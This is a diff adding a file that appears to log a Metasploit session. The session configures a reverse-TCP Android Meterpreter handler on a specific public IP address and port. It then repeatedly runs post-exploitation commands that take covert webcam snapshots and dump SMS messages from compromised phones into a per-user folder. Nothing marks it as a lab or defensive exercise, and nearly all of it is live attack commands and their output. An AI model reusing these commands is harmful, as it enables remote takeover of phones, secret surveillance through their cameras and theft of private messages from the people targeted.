@@ -1,0 +1,61 @@
+root@RatHat:~/django# msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set ExitOnSession true
+set lhost 185.120.221.217
+set lport 4457
+exploit
+
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
+
+
+       =[ metasploit v5.0.5-dev                           ]
++ -- --=[ 1854 exploits - 1049 auxiliary - 325 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set ExitOnSession true
+ExitOnSession => true
+msf5 exploit(multi/handler) > set lhost 185.120.221.217
+lhost => 185.120.221.217
+msf5 exploit(multi/handler) > set lport 4457
+lport => 4457
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 185.120.221.217:4457
+webcam_snap -i 1 -p /root/django/users/nemesis/webcamsnap1.jpeg
+dump_sms -o /root/django/users/nemesis/dumpsms.txt
+webcam_snap -i 1 -p /root/django/users/nemesis/webcamsnap1.jpeg
+webcam_snap -i 2 -p /root/django/users/nemesis/webcamsnap2.jpg
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set ExitOnSession true
+set lhost 185.120.221.217
+set lport 4457
+exploit
+webcam_snap -i 1 -p /root/django/users/nemesis/webcamsnap1.jpeg
+webcam_snap -i 2 -p /root/django/users/nemesis/webcamsnap2.jpg
+dump_sms -o /root/django/users/nemesis/dumpsms.txt
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set ExitOnSession true
+set lhost 185.120.221.217
+set lport 4457
+exploit
+^C[-] Exploit failed [user-interrupt]: Interrupt
+[-] exploit: Interrupted
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 185.120.221.217:4457
+webcam_snap -i 1 -p /root/django/users/nemesis/webcamsnap1.jpeg
+
